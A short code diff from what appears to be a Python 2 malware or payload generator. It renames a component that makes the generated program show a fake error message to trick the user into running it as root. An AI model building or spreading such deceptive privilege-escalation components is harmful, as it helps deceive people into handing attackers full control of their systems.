@@ -7,13 +7,13 @@ config.main()
 def main(option):
     if option == 'generate':
         config.import_statements.append('import os')
-        config.startup.append('req_root()')
+        config.startup.append('req_root_startup()')
         print config.war + 'Manual intervention required for req_root startup component'
         message = raw_input(config.pro + 'Social engineering message to display to the user to request for root [Enter for default message] : ')
         if not message:
             message = 'ERROR - This file must be run as root to work'
         config.functions.append('''
-def req_root():
+def req_root_startup():
     if os.getuid() == 0:
         return
     else:
